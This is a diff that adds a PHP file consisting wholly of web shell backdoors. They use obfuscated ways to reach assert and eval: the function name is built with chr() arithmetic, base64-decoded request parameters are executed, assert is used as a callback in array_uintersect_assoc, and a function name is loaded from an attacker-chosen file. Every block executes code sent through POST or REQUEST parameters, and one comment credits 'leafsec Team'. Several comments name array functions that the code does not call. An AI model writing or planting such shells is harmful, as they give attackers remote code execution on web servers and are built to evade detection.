@@ -1,0 +1,96 @@
+<?php
+	$_="s"."se";
+	$_= chr((97 ^ 1)+1).$_."r".'t';
+	$pp = $_;
+	$pp(base64_decode($_REQUEST['g']));
+?>
+
+<?php 
+//array_uintersect_assoc leafsec Team
+	$a1=array($_POST['admin']); 
+	$result=array_uintersect_assoc($a1,array(""),"assert"); 
+	print_r($result); 
+?>
+	
+<?php
+	$___Ss = chr((97 ^ 1)+1);  //[a]
+	$___Ss .=chr((115 ^ 1)+1); //[s]
+	$___Ss .=chr((115 ^ 1)+1); //[s]
+	$___Ss .=chr((101 ^ 1)+1); //[e]
+	$___Ss .=chr((114 ^ 0)); //[r]
+	$___Ss .=chr((116 ^ 0)); //[t]
+	$___Ss($_POST['usernamme']);
+?>
+	
+<?php
+	if(isset($_POST['filename'])){
+	    $function =  file_get_contents($_POST['filename']);
+	    $function($_POST['username']);
+	}
+?>
+
+<?php
+	if(isset($_POST['filename'])){
+	$function =  file_get_contents($_POST['filename']);
+   	$function(base64_decode($_POST['username']));
+}
+?>
+
+/*
+array_udiff_assoc()
+array_udiff_uassoc()
+array_intersect_assoc()
+array_intersect_uassoc()
+array_uintersect()
+array_uintersect_uassoc()
+array_uintersect_uassoc()
+*/
+
+<?php
+//array_uintersect_assoc
+	$a1=array($_POST['admin']);
+	$result=array_uintersect_assoc($a1,array(""),"assert");
+	print_r($result);
+?>
+
+<?php
+//array_intersect_assoc()
+	$a1=array($_POST['admin']);
+	$result=array_uintersect_assoc($a1,$a1,"assert");
+	print_r($result);
+?>
+
+<?php
+//array_intersect_uassoc()
+	$a1=array($_POST['admin']);
+	$result=array_uintersect_assoc($a1,$a1,"assert");
+	print_r($result);
+?>
+
+<?php
+//array_uintersect()
+	$a1=array($_POST['admin']);
+	$result=array_uintersect_assoc($a1,$a1,"assert");
+	print_r($result);
+?>
+
+<?php
+//array_uintersect_assoc()
+	$a1=array($_POST['admin']);
+	$result=array_uintersect_assoc($a1,$a1,"assert");
+	print_r($result);
+?>
+
+<?php
+//array_uintersect_uassoc()
+	$a1=array($_POST['admin']);
+	$result=array_uintersect_assoc($a1,$a1,"assert");
+	print_r($result);
+?>
+
+<?php
+//array_uintersect_uassoc()
+	$a1=array($_POST['admin']);
+	$result=array_uintersect_assoc($a1,$a1,"assert");
+	print_r($result);
+?>
